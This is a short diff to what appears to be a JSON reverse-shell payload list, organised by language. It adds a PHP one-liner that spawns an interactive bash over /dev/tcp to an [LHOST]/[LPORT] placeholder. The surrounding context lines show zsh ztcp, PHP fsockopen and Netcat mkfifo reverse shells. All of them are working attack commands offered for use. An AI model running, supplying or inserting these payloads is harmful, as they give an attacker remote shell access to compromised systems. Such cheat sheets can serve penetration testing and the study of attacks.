@@ -24845,7 +24845,8 @@
       "zsh -c 'zmodload zsh/net/tcp && ztcp [LHOST] [LPORT] && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
     ],
     "PHP": [
-      "php -r '$sock=fsockopen(getenv(\"[LHOST]\"),getenv(\"[LPORT]\"));exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+      "php -r '$sock=fsockopen(getenv(\"[LHOST]\"),getenv(\"[LPORT]\"));exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+      "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1'\"); ?>"
     ],
     "Netcat": [
       "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [LHOST] [LPORT] >/tmp/f"
